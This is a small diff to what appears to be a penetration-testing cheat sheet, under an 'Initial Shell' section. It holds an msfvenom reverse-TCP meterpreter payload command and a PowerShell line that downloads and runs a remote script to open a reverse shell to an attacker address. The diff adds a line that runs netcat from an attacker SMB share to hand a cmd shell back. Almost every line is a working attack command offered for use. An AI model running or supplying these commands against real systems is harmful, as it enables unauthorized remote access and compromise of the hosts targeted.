@@ -1446,6 +1446,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 [*] Initial Shell
 +---------- Execute ----------+
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
+\\$MYIP\share\nc.exe $MYIP 5555 -e cmd
 
 [*] File Transfer
 -->> Serve
